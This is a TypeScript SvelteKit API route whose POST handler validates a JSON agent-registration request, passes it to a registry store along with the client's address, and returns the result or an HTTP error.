import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import type { AgentRegistrationRequest } from '../../../../../../shared/types/auth';

export const POST: RequestHandler = async ({ request, getClientAddress }) => {
	let payload: AgentRegistrationRequest;
	try {
		payload = (await request.json()) as AgentRegistrationRequest;
	} catch {
		throw error(400, 'Invalid registration payload');
	}

	if (!payload?.metadata) {
		throw error(400, 'Missing agent metadata');
	}

	try {
		const response = registry.registerAgent(payload, {
			remoteAddress: getClientAddress()
		});
		return json(response);
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to register agent');
	}
};
